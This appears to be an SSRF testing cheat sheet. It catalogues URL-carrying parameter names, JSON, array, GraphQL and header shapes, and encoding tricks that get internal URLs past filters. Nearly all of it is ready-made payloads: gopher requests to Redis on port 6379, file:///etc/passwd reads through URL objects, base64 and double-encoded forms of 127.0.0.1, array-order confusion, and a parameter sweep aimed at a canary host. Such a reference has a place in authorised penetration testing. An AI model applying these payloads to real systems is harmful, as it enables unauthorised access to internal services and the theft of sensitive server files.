# JSON params — the url-field's structural variants

The url isn't always `url=` — the fetcher-parameter takes JSON-
objects, arrays, nested-fields, alternate names. Map the surface
before spraying.

---

## 1. The parameter-name table — the vocabulary

```text
url=           the canonical
uri=           the alt
link=          the casual
href=          the anchor-word
src=           the embed-word
source=        the noun
dest=          the noun
destination=   the noun
target=        the noun
host=          the host-only
address=       the host-only
domain=        the host-only
site=          the noun
endpoint=      the api-word
callback=      the webhook-word
webhook=       the webhook-word
hook=          the webhook-word
notify=        the webhook-word
ping=          the webhook-word
feed=          the rss-word
feed_url=      the rss-word
rss=           the rss-word
fetch=         the verb
fetch_url=     the verb
load=          the verb
load_url=      the verb
import=        the verb
import_url=    the verb
download=      the verb
download_url=  the verb
read=          the verb
read_url=      the verb
get=           the verb
get_url=       the verb
request=       the verb
request_url=   the verb
path=          the file-word — the LFI-adjacent
file=          the file-word
filename=      the file-word
document=      the file-word
doc=           the file-word
resource=      the file-word
image=         the media-word
image_url=     the media-word
img=           the media-word
img_url=       the media-word
avatar=        the media-word
avatar_url=    the media-word
picture=       the media-word
picture_url=   the media-word
photo=         the media-word
thumbnail=     the media-word
thumb=         the media-word
cover=         the media-word
proxy=         the proxy-word
proxy_url=     the proxy-word
redirect=      the redirect-word
redirect_url=  the redirect-word
next=          the redirect-word
return=        the redirect-word
return_url=    the redirect-word
continue=      the redirect-word
goto=          the redirect-word
to=            the redirect-word
u=             the short-form
q=             the short-form
a=             the short-form
data=          the generic
data_url=      the generic
content_url=   the generic
media_url=     the generic
external_url=  the generic
remote_url=    the generic
out=           the out-word
ref=           the ref-word
reference=     the ref-word
origin=        the origin-word
origin_url=    the origin-word
server=        the server-word
server_url=    the server-word
api_url=       the api-word
base_url=      the api-word
backend_url=   the api-word
wsdl=          the soap-word
wsdl_url=      the soap-word
soap_url=      the soap-word
xml_url=       the xml-word
sitemap=       the seo-word
sitemap_url=   the seo-word
manifest=      the pwa-word
manifest_url=  the pwa-word
config_url=    the config-word
remote=        the remote-word
remote_addr=   the remote-word
remote_file=   the remote-word
remote_host=   the remote-word
```

## 2. The structural shapes — how the url is carried

```text
the flat-string:      url=http://x/
the json-string:      {"url":"http://x/"}
the json-object:      {"url":{"host":"internal","port":6379}}
the json-nested:      {"request":{"url":"http://x/"}}
the json-array:       {"urls":["http://x/"]}
the form-array:       url[]=http://x/  url[0]=http://x/
the object-param:     url[host]=internal&url[port]=6379  (rails/php)
the nested-form:      request[url]=http://x/
the multipart-field:  a form-field in multipart — same-name
the graphql-var:      {"query":"mutation{fetch(url:\"http://x/\")}"}
the xml-element:      <url>http://x/</url>
the base64-field:     url=aHR0cDovL3gv — encoded-input — the app
                      decodes then fetches — the encode-decode layer
the url-encoded:      url=http%3a%2f%2fx%2f — the encoded-form
the double-encoded:   url=%2568%2574%2574%2570 — the decode-twice
the proto-object:     {"url":{"$type":"fetch","value":"http://x/"}}
```

## 3. The object-shape tricks — when the url is structured

```text
{"host":"internal","port":6379}              — the parts — the app
                                             reassembles — inject
                                             the parts
{"host":"internal","port":6379,"scheme":"gopher"}
{"host":"internal","port":6379,"path":"/_PING"}
{"protocol":"gopher","host":"127.0.0.1","port":6379}
{"url":{"protocol":"file","path":"/etc/passwd"}}
{"uri":{"scheme":"file","host":"","path":"/etc/passwd"}}
{"host":"internal","port":"6379/_PING"}      — the port-carries-
                                             the-path trick —
                                             "6379/_PING" — the
                                             port-field as a url-
                                             fragment
{"host":"internal:6379"}                     — host:port in one
{"host":"internal","path":"/etc/passwd","scheme":"file"}
```

## 4. The array-shape tricks

```text
url[]=http://internal/      — php-array — the param is an array —
                              the app may take [0] or implode —
                              or the array-type crashes the check
url[]=http://x/&url[]=http://internal/  — two-entries — the check
                                        sees [0], the fetcher uses
                                        [1]? — the array-order-diff
url[0]=http://internal/
url[1]=http://internal/
url[]=internal
{"urls":["http://internal/"]}
{"urls":["http://x/","http://internal/"]}  — the array-of-urls —
                                           which one fetches?
```

## 5. The encoded-layer — decode-then-fetch

```text
url=aHR0cDovLzEyNy4wLjAuMS8=    — base64 — the app decodes →
                                  fetches — the CHECK may run on
                                  the encoded-form — the encoded-
                                  internal passes string-checks!
url=68747470… (hex-encoded)
url=%2568%2574%2574%2570%253a… — double-%-encoded — the app
                                  double-decodes → the filter saw
                                  the once-encoded-form — decoded
                                  to internal on the second pass
url=H4sIAAAA… (gzip+base64)
url=http%3a%2f%2f127.0.0.1%2f   — once-encoded — routine
```

The decode-order is the bypass — the check runs at one decode-
level, the fetch at another — encoded-internal passes string-
checks trivially.

## 6. The graphql-shape — the resolver-args

```text
{"query":"{ fetch(url:\"http://internal/\") }"}
{"query":"mutation { fetchUrl(url:\"http://internal/\") { status } }"}
{"query":"{ image(url:\"file:///etc/passwd\") }"}
{"url":"http://internal/","query":"{x}"}
   — the url-arg is a VARIABLE or inline — the resolver-args are
     the surface — the fetch-resolver names itself fetch/load/
     preview/import/proxy/image/url — introspection finds them
```

## 7. The multipart-mixed — the field-boundary

```text
a url inside a multipart-field — same as form — plus:
  - the field-NAME variants — the upload's url-field
  - the filename-as-url — filename="http://x/" — some handlers
    take the filename as a source
  - the content-disposition-url — a header-field
```

## 8. The header-carried — the url in a header

```text
X-Forwarded-Host: internal   — the app reads the forwarded-host
                             to build a fetch — the host-header
                             attack — different class mostly —
                             but if the app fetches "the host you
                             sent" → indirect-ssrf
Referer: http://internal/    — some analytics fetch the referer —
                             the referer-fetch — the deferred
X-Original-URL / X-Rewrite-URL — the rewrite-headers — proxy-trust
```

## 9. The param-discovery — finding the fetch-field

```text
- source-grep first — the fetch-call's argument-name
- the front-end js — the fetch-call's param-names — bundle_miner
- the form-fields — the input-names in the page
- the api-docs — the openapi/spec — the param-list
- the error-messages — "missing url", "invalid target" — the param
  names in the errors
- the redirect-param — often a fetch (the redirect IS a fetch)
```

## 10. The object-vs-string confusion

```text
url={"host":"internal"}     — the string-field carrying an object —
                              the app's url-field expects a string —
                              the object-surprises it — type-
                              confusion — the parse may read the
                              object-keys — the host-field inside
url[$ne]=x                   — nosql-ish — different class
url[__proto__]=x             — proto-pollution — different class —
                              but the url-object CAN carry proto-
                              pollution if the app builds urls from
                              objects
```

## 11. The canonical test-set — the param-shape sweep

```text
url=http://YOUR/
link=http://YOUR/
src=http://YOUR/
target=http://YOUR/
callback=http://YOUR/
feed=http://YOUR/
import=http://YOUR/
image=http://YOUR/
{"url":"http://YOUR/"}
{"target":"http://YOUR/"}
{"webhook":"http://YOUR/"}
url[]=http://YOUR/
url[host]=YOUR&url[port]=80
— a bounded set — each to the canary — the ones that fire are the
  real surface — the canary-tag names the param that worked
```
